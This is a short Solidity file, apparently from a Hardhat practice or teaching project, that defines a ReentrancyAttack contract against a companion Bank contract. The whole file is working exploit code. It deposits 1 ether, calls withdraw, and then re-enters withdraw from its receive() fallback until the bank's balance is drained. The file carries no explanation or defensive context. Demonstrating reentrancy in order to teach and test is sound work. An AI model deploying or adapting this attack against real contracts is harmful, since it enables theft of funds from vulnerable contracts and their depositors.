// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./Bank.sol";

// Uncomment this line to use console.log
// import "hardhat/console.sol";

contract ReentrancyAttack {
    uint256 constant PAY_AMOUNT = 1 ether;

    Bank bank;

    constructor(Bank _bank) {
        bank = _bank;
    }

    function attack() public payable {
        require(msg.value == PAY_AMOUNT, "need to send 1 ether");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        if (bank.getBalance() >= PAY_AMOUNT) {
            bank.withdraw();
        }
    }
}
